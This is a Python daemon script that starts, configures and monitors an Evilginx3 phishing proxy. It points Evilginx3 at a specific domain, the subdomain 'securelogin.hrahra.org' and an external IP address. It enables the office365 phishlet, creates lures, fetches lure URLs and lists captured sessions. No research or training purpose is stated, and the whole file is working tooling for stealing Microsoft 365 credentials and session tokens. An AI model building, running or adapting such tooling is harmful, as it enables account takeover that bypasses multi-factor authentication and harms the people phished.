#!/usr/bin/env python3
import subprocess
import json
import time
import sys
import os
from pathlib import Path

class EvilginxDaemon:
    def __init__(self):
        self.domain = "hrahra.org"
        self.subdomain = "securelogin.hrahra.org"
        self.external_ip = "134.199.198.228"
        self.evilginx_dir = "/opt/posh-ai/evilginx3"
        self.service_name = "evilginx3"
        
    def run_cmd(self, cmd, check=True):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            if check:
                print(f"Command failed: {cmd}")
                print(f"Error: {e.stderr}")
                sys.exit(1)
            return None
    
    def is_service_active(self):
        result = self.run_cmd(f"systemctl is-active {self.service_name}", check=False)
        return result == "active"
    
    def start_service(self):
        if not self.is_service_active():
            print("Starting Evilginx3 service...")
            self.run_cmd(f"systemctl start {self.service_name}")
            time.sleep(5)
        else:
            print("Evilginx3 service already running")
    
    def stop_service(self):
        if self.is_service_active():
            print("Stopping Evilginx3 service...")
            self.run_cmd(f"systemctl stop {self.service_name}")
        else:
            print("Evilginx3 service not running")
    
    def restart_service(self):
        print("Restarting Evilginx3 service...")
        self.run_cmd(f"systemctl restart {self.service_name}")
        time.sleep(5)
    
    def get_status(self):
        status = {
            "service_active": self.is_service_active(),
            "nginx_active": self.run_cmd("systemctl is-active nginx", check=False) == "active",
            "ssl_cert_valid": self.check_ssl_cert(),
            "listening_ports": self.get_listening_ports(),
            "recent_logs": self.get_recent_logs()
        }
        return status
    
    def check_ssl_cert(self):
        cert_path = f"/etc/letsencrypt/live/{self.domain}/fullchain.pem"
        if not os.path.exists(cert_path):
            return False
        
        try:
            result = self.run_cmd(f"openssl x509 -enddate -noout -in {cert_path}")
            return "notAfter=" in result
        except:
            return False
    
    def get_listening_ports(self):
        try:
            result = self.run_cmd("netstat -tlnp | grep -E ':(80|443|8443|53)\\s'")
            return result.split('\n') if result else []
        except:
            return []
    
    def get_recent_logs(self):
        try:
            result = self.run_cmd(f"journalctl -u {self.service_name} --no-pager -n 10")
            return result.split('\n')[-5:] if result else []
        except:
            return []
    
    def configure_evilginx(self):
        if not self.is_service_active():
            print("Service not running, starting first...")
            self.start_service()
        
        config_commands = [
            f"config domain {self.domain}",
            f"config ipv4 external {self.external_ip}",
            f"phishlets hostname office365 {self.subdomain}",
            "phishlets enable office365",
            "lures create office365"
        ]
        
        config_file = "/tmp/evilginx_auto_config.txt"
        with open(config_file, 'w') as f:
            for cmd in config_commands:
                f.write(f"{cmd}\n")
            f.write("exit\n")
        
        try:
            self.run_cmd(f"timeout 30 {self.evilginx_dir}/evilginx -p {self.evilginx_dir}/phishlets < {config_file}")
        except:
            pass
        finally:
            os.remove(config_file)
    
    def create_lure(self):
        lure_cmd = f"echo 'lures create office365' | {self.evilginx_dir}/evilginx -p {self.evilginx_dir}/phishlets"
        try:
            result = self.run_cmd(lure_cmd)
            print("Lure created successfully")
            return result
        except:
            print("Failed to create lure")
            return None
    
    def get_lure_url(self):
        url_cmd = f"echo 'lures get-url 0' | {self.evilginx_dir}/evilginx -p {self.evilginx_dir}/phishlets"
        try:
            result = self.run_cmd(url_cmd)
            return result
        except:
            return None
    
    def monitor_sessions(self):
        sessions_cmd = f"echo 'sessions' | {self.evilginx_dir}/evilginx -p {self.evilginx_dir}/phishlets"
        try:
            result = self.run_cmd(sessions_cmd)
            return result
        except:
            return None
    
    def print_status(self):
        status = self.get_status()
        print("=== Evilginx3 Enterprise Status ===")
        print(f"Service Status: {'ACTIVE' if status['service_active'] else 'INACTIVE'}")
        print(f"Nginx Status: {'ACTIVE' if status['nginx_active'] else 'INACTIVE'}")
        print(f"SSL Certificate: {'VALID' if status['ssl_cert_valid'] else 'INVALID'}")
        print(f"Domain: {self.subdomain}")
        print(f"External IP: {self.external_ip}")
        
        if status['listening_ports']:
            print("Listening Ports:")
            for port in status['listening_ports']:
                print(f"  {port}")
        
        if status['recent_logs']:
            print("Recent Logs:")
            for log in status['recent_logs']:
                print(f"  {log}")

def main():
    daemon = EvilginxDaemon()
    
    if len(sys.argv) < 2:
        print("Usage: python3 daemon_manager.py {start|stop|restart|status|configure|lure|monitor}")
        sys.exit(1)
    
    action = sys.argv[1].lower()
    
    if action == "start":
        daemon.start_service()
    elif action == "stop":
        daemon.stop_service()
    elif action == "restart":
        daemon.restart_service()
    elif action == "status":
        daemon.print_status()
    elif action == "configure":
        daemon.configure_evilginx()
    elif action == "lure":
        result = daemon.create_lure()
        if result:
            print(result)
    elif action == "monitor":
        result = daemon.monitor_sessions()
        if result:
            print(result)
    else:
        print("Invalid action. Use: start|stop|restart|status|configure|lure|monitor")
        sys.exit(1)

if __name__ == "__main__":
    main()
